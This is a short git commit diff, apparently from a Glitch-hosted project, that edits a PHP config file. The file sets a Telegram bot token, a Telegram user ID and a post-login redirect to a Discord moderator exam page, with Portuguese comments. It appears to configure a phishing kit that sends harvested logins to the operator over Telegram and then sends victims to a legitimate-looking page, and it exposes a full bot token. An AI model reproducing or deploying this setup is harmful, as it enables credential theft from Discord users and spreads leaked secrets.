d4364b89dd2a9720aeca6a023b6a20f54796e497
Glitch (emphasized-shy-thread) <none>
2022-02-21 21:45:29 +0000

    🌹👙 Checkpoint ./core/system/config.php:18375389/81

--- core/system/config.php
+++ core/system/config.php
@@ -1,6 +1,6 @@
 <?php
 
-    $bot_token = 'AAHxlxhgl2HYBi0Jsf9umxfAGLk4haR-mkQ'; # Telegram Bot Token
+    $bot_token = '5159498596:AAHxlxhgl2HYBi0Jsf9umxfAGLk4haR-mkQ'; # Telegram Bot Token
     $user_id = '5053644619'; # Telegram User ID (apenas os numeros ou caso queira colocar mais de um use 'id1', 'id2', 'id3'
 
     $url_redirect = "https://survey.alchemer.com/s3/6323420/Discord-Moderator-Academy-Exam"; # URL Pra onde vai redirecionar depois do login
